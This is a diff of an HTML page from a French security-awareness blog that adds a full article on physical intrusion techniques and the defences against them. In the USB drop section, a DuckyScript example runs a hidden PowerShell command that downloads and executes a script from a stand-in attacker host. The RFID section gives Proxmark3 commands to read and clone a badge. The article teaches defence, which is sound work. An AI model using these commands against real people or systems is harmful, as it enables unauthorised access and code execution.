@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>Sécurité physique : quand les hackers passent la porte — Temgus.CyberBlog</title>
 <meta name="description" content="Tailgating, lock picking, clonage de badges RFID, USB drop attacks — les techniques d'intrusion physique et comment s'en protéger.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/securite-physique.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/securite-physique.html">
 <meta property="og:title" content="Sécurité physique : quand les hackers passent la porte — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="Sécurité physique : quand les hackers passent la porte — Temgus.CyberBlog">
 <meta name="twitter:description" content="Tailgating, lock picking, clonage de badges RFID, USB drop attacks — les techniques d'intrusion physique et comment s'en protéger.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,488 @@
   "headline": "Sécurité physique : quand les hackers passent la porte",
   "description": "Tailgating, lock picking, clonage de badges RFID, USB drop attacks — les techniques d'intrusion physique et comment s'en protéger.",
   "datePublished": "2025-07-01",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/securite-physique.html",
   "inLanguage": "fr",
   "keywords": "sécurité physique, RFID, lock picking, red team, USB",
-  "timeRequired": "PT10M"
+  "timeRequired": "PT10M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">🚪</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">Sécurité physique : quand les hackers passent la porte</h1>
-  <p style="color:#8892a4;max-width:500px">Tailgating, lock picking, clonage de badges RFID, USB drop attacks — les techniques d'intrusion physique et comment s'en protéger.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#securite-physique" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">🚪</div>
+    <div class="meta-info">
+      <div class="meta-category">Sécurité physique</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">Sécurité physique : quand les hackers passent la porte</div>
+      <div class="meta-details">
+        <span>📅 2025-07-01</span>
+        <span>⏱ 10 min de lecture</span>
+        <span>🏷 Intermédiaire</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#pourquoi-la-s-curit-physique-est-critique">Pourquoi la sécurité physique est critique</a></li>
+<li><a href="#techniques-d-intrusion-physique">Techniques d'intrusion physique</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#tailgating-et-piggybacking">Tailgating et Piggybacking</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#lock-picking-crochetage-de-serrures">Lock Picking — Crochetage de serrures</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#clonage-de-badges-rfid">Clonage de badges RFID</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#usb-drop-attack">USB Drop Attack</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#dumpster-diving">Dumpster Diving</a></li>
+<li><a href="#red-team-physique-m-thodologie">Red Team physique — Méthodologie</a></li>
+<li><a href="#mesures-de-protection">Mesures de protection</a></li>
+<li><a href="#test-de-p-n-tration-physique-cadre-l-gal">Test de pénétration physique — Cadre légal</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>Sécurité physique : quand les hackers passent la porte</h1>
+
+<p>La cybersécurité ne se limite pas aux écrans et aux réseaux. La <strong>sécurité physique</strong> est souvent le maillon faible d'une organisation — un attaquant qui entre physiquement dans vos locaux peut contourner en quelques minutes toutes vos défenses numériques.</p>
+
+<h2 id="pourquoi-la-s-curit-physique-est-critique">Pourquoi la sécurité physique est critique</h2>
+
+<pre><code>Statistique choc :
+<p>Un attaquant qui branche une clé USB malveillante sur un poste</p>
+<p>→ Accès au réseau interne en &lt; 60 secondes</p>
+<p>→ Contourne firewall, antivirus, VPN</p>
+<p>→ Bypasse toute l'infrastructure de sécurité réseau</p>
+
+<p>Kevin Mitnick (l'un des hackers les plus célèbres) :</p>
+<p>"La sécurité physique est la mère de toutes les sécurités.</p>
+<p>Si quelqu'un peut toucher votre matériel, il peut le compromettre."</code></pre>
+
+<h2 id="techniques-d-intrusion-physique">Techniques d'intrusion physique</h2>
+
+<h3 id="tailgating-et-piggybacking">Tailgating et Piggybacking</h3>
+
+<pre><code>Tailgating :
+<p>Suivre discrètement un employé autorisé dans une zone sécurisée</p>
+<p>→ L'employé badge → La porte s'ouvre → L'attaquant entre derrière</p>
+
+<p>Piggybacking :</p>
+<p>Avec la complicité (involontaire) d'un employé</p>
+<p>→ "Vous pouvez me tenir la porte ? J'ai les mains chargées"</p>
+<p>→ Uniforme de livreur, technicien, agent de nettoyage</p>
+
+<p>Statistiques :</p>
+<p>→ 74% des employés tiennent la porte à quelqu'un sans badge</p>
+<p>→ Un uniforme de livreur Amazon = accès quasi garanti</code></pre>
+
+<h3 id="lock-picking-crochetage-de-serrures">Lock Picking — Crochetage de serrures</h3>
+
+<pre><code class="language-bash"># Types de serrures et leur résistance
+
+<p>Serrures à gorges (anciennes) :</p>
+<p>→ Crochetage facile en 30 secondes</p>
+<p>→ Outils : crochet + tension wrench</p>
+<p>→ Résistance : très faible</p>
+
+<p>Serrures à cylindre européen :</p>
+<p>→ Plus résistantes</p>
+<p>→ Techniques : single pin picking, raking</p>
+<p>→ Temps moyen expert : 2-5 minutes</p>
+
+<p>Serrures Abloy (disques rotatifs) :</p>
+<p>→ Très résistantes au crochetage</p>
+<p>→ Nécessitent des outils spécialisés</p>
+<p>→ Recommandées pour les zones sensibles</p>
+
+<p>Serrures électroniques à badge :</p>
+<p>→ Résistantes au crochetage physique</p>
+<p>→ MAIS vulnérables au clonage RFID (voir section suivante)</p>
+
+<h1>Outils de lock picking légaux (pour formation)</h1>
+<p>→ Kit Peterson</p>
+<p>→ Multipick</p>
+<p>→ Sparrows</p>
+<h1>Note : posséder ces outils sans raison légitime peut être illégal</code></pre></h1>
+
+<h3 id="clonage-de-badges-rfid">Clonage de badges RFID</h3>
+
+<pre><code class="language-python"># Les badges d'accès RFID 125kHz (HID, EM4100) sont facilement clonables
+
+<h1>Matériel nécessaire :</h1>
+<h1>Proxmark3 (300-500€) ou lecteur EM4100 (~15€ sur AliExpress)</h1>
+<h1>Carte vierge T5577 (~1€)</h1>
+
+<h1>Lire un badge depuis 10-20cm (dans la poche !)</h1>
+<p>pm3 --&gt; lf hid read</p>
+<h1>Résultat : [+] HID Prox ID: 2004263f5c</h1>
+
+<h1>Cloner sur une carte vierge</h1>
+<p>pm3 --&gt; lf hid clone -r 2004263f5c</p>
+
+<h1>L'attaquant peut cloner votre badge sans jamais vous toucher</h1>
+<h1>Dans le métro, dans un ascenseur, dans une file d'attente</h1>
+
+<h1>Protection :</h1>
+<h1>→ Utiliser des badges MIFARE DESFire (chiffrement AES-128)</h1>
+<h1>→ Étuis RFID-blocking pour les badges</h1>
+<h1>→ Implémenter un second facteur (badge + PIN)</code></pre></h1>
+
+<h3 id="usb-drop-attack">USB Drop Attack</h3>
+
+<pre><code>Scénario classique :
+<li>L'attaquant dépose des clés USB dans le parking</li>
+<li>Employé curieux la branche sur son poste</li>
+<li>Exécution automatique du payload</li>
+<li>Reverse shell vers l'attaquant</li>
+
+<p>Types de périphériques malveillants :</p>
+<p>→ USB Rubber Ducky : simule un clavier, tape des commandes</p>
+<p>→ O.MG Cable : câble USB Lightning/USB-C avec WiFi intégré</p>
+<p>→ LAN Turtle : crée un tunnel réseau via USB</p>
+<p>→ Bash Bunny : couteau suisse des attaques USB</p>
+
+<h1>Rubber Ducky payload exemple (DuckyScript)</h1>
+<p>DELAY 1000</p>
+<p>GUI r                    # Windows + R</p>
+<p>DELAY 500</p>
+<p>STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attaquant.com/payload.ps1')"</p>
+<p>ENTER</p>
+
+<h1>Exécuté en &lt; 3 secondes après branchement</code></pre></h1>
+
+<h3 id="dumpster-diving">Dumpster Diving</h3>
+
+<pre><code>Fouiller les poubelles d'une entreprise peut révéler :
+<p>→ Documents avec mots de passe écrits</p>
+<p>→ Organigrammes (cibles pour le spear phishing)</p>
+<p>→ Anciens disques durs non effacés</p>
+<p>→ Badges expirés (pour analyser le format)</p>
+<p>→ Notes post-it avec credentials</p>
+<p>→ Relevés bancaires, contrats</p>
+
+<p>Statistique : 40% des entreprises jettent des documents</p>
+<p>sensibles sans les détruire</p>
+
+<p>Protection :</p>
+<p>→ Destructeur de documents (coupe croisée minimum)</p>
+<p>→ Effacement sécurisé des disques (DBAN, dd /dev/zero)</p>
+<p>→ Politique de destruction des supports</code></pre>
+
+<h2 id="red-team-physique-m-thodologie">Red Team physique — Méthodologie</h2>
+
+<pre><code>Phase 1 : Reconnaissance externe
+<p>→ Google Maps / Street View du bâtiment</p>
+<p>→ LinkedIn pour identifier les employés (uniforme, badges visibles)</p>
+<p>→ Horaires d'entrée/sortie (observation)</p>
+<p>→ Prestataires réguliers (sécurité, nettoyage, IT)</p>
+
+<p>Phase 2 : Prétexting (légende)</p>
+<p>→ Créer une identité crédible</p>
+<p>→ Technicien informatique → "Je viens faire la maintenance du serveur"</p>
+<p>→ Auditeur → "Je suis mandaté par la direction pour un audit"</p>
+<p>→ Livreur → Uniforme + colis factice</p>
+
+<p>Phase 3 : Intrusion</p>
+<p>→ Tailgating derrière un employé</p>
+<p>→ Exploiter une entrée secondaire moins surveillée</p>
+<p>→ Heure de pointe (9h-9h30) = flux important = moins de vigilance</p>
+
+<p>Phase 4 : Actions sur objectif</p>
+<p>→ Brancher un implant réseau (LAN Turtle, Raspberry Pi)</p>
+<p>→ Cloner des badges</p>
+<p>→ Photographier des informations sensibles</p>
+<p>→ Accéder à un poste déverrouillé</p>
+
+<p>Phase 5 : Exfiltration</p>
+<p>→ Sortir discrètement</p>
+<p>→ Rapport détaillé pour l'organisation cliente</code></pre>
+
+<h2 id="mesures-de-protection">Mesures de protection</h2>
+
+<pre><code>Contrôle d'accès physique :
+<p>✅ Sas d'entrée (mantrap) : une seule personne à la fois</p>
+<p>✅ Badges avec photo + chiffrement (MIFARE DESFire)</p>
+<p>✅ Caméras à toutes les entrées avec enregistrement 30 jours</p>
+<p>✅ Réceptionniste formé à vérifier les identités</p>
+<p>✅ Procédure visiteurs : escorte obligatoire dans les locaux</p>
+<p>✅ Zones de sécurité (zones vertes/oranges/rouges)</p>
+
+<p>Matériel :</p>
+<p>✅ Câble Kensington sur les laptops</p>
+<p>✅ Clean desk policy (pas de documents sensibles visibles)</p>
+<p>✅ Écrans de confidentialité (privacy screen)</p>
+<p>✅ Verrouillage automatique des postes après 5 minutes</p>
+<p>✅ Désactivation des ports USB sur les postes sensibles</p>
+<p>✅ Destruction sécurisée des documents et supports</p>
+
+<p>Formation :</p>
+<p>✅ Sensibilisation au tailgating (ne pas laisser entrer sans badge)</p>
+<p>✅ Politique "si vous ne reconnaissez pas quelqu'un, demandez"</p>
+<p>✅ Signalement des comportements suspects</p>
+<p>✅ Test régulier par des pentesters physiques</code></pre>
+
+<h2 id="test-de-p-n-tration-physique-cadre-l-gal">Test de pénétration physique — Cadre légal</h2>
+
+<pre><code>⚠️ IMPORTANT : Tout test physique DOIT être autorisé par écrit
+
+<p>Avant un Red Team physique :</p>
+<p>→ Contrat signé avec périmètre défini</p>
+<p>→ Lettre d'autorisation signée par la direction</p>
+<p>→ Numéro d'urgence si vous êtes intercepté</p>
+<p>→ Coordination avec la sécurité interne (si nécessaire)</p>
+
+<p>Sans autorisation écrite :</p>
+<p>→ Intrusion dans un bâtiment = délit</p>
+<p>→ Clonage de badge = violation de données</p>
+<p>→ Branchement d'équipements = accès frauduleux à un STAD</p>
+<p>→ Peines : jusqu'à 5 ans de prison et 150 000€ d'amende</p>
+
+<p>La règle d'or : "Get out of jail free card"</p>
+<p>→ Document signé par le RSSI/DG attestant l'autorisation</p>
+<p>→ À présenter si vous êtes arrêté par la sécurité ou la police</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>La sécurité physique est souvent négligée au profit de la cybersécurité technique. Pourtant, <strong>un badge cloné ou une clé USB abandonnée peuvent compromettre une organisation entière en quelques minutes</strong>. Une vraie posture de sécurité combine défenses numériques ET physiques : contrôle d'accès strict, formation des employés au tailgating et tests d'intrusion physique réguliers.</p>
+
+<p>---</p>
+<p><em>Catégorie : Sécurité physique</em></p>
+</article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#securite-physique" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/infrastructures-critiques-cyberattaques.html" class="nav-prev">← Infrastructures critiques sous attaque : eau, énergie, hôpitaux</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/cybercriminalite-dark-web.html" class="nav-next">Cybercriminalité et dark web : comprendre l'écosystème →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
